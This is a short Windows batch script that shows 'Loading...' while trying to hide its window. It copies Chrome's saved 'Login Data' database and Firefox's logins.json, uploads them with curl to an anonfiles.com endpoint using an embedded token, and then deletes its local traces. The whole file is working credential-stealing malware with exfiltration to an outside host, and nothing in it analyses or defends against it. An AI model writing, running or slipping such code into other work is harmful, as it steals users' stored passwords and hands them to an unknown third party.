@echo off
echo Loading...
:powershell -window minimized -command ""
:powershell -window hidden -command ""
cd C:/
md Upld
cd Upld
set mainpath=%cd%

cd C:/
mkdir logindata
del /f /q "C:\logindata\*"
cd logindata
copy "%LocalAppData%\Google\Chrome\User Data\Default\Login Data" logindata_%UserName%_%Date%.chrome

echo Firefox
cd "%appdata%\Mozilla\Firefox\Profiles"
cd *-release
copy logins.json "C:\logindata\firefox_%username%_%date%.json"
echo firefox done

curl -F "file=@firefox_%username%_%date%.json" https://api.anonfiles.com/upload?token=8891a80e1fb277f0
curl -F "file=@logindta_%username%_%date%.chrome" https://api.anonfiles.com/upload?token=8891a80e1fb277f0

timeout 3
del /f /q "C:\logindata\*"